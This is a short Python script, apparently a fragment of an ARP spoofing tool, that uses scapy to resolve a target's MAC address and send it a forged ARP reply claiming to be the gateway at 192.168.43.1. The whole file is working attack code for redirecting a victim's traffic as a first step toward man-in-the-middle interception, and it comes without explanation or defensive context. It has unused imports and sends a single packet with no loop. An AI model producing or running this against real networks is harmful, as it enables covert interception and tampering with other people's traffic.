import time
import scapy.all as scapy
from subprocess import check_output

def get_mac(ip):
   arp_requests = scapy.ARP(pdst = ip)
   broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
   arp_requests_broadcast = broadcast / arp_requests
   answered_list = scapy.srp(arp_requests_broadcast,timeout=5,verbose=False)[0]
   return answered_list[0][1].hwsrc


def spoof(target_ip,spoof_ip):
   packet = scapy.ARP(op = 2,pdst = target_ip,
                   hwdst = get_mac(target_ip),
                             psrc = spoof_ip)
   scapy.send(packet,verbose = False)

spoof("192.168.43.170","192.168.43.1")

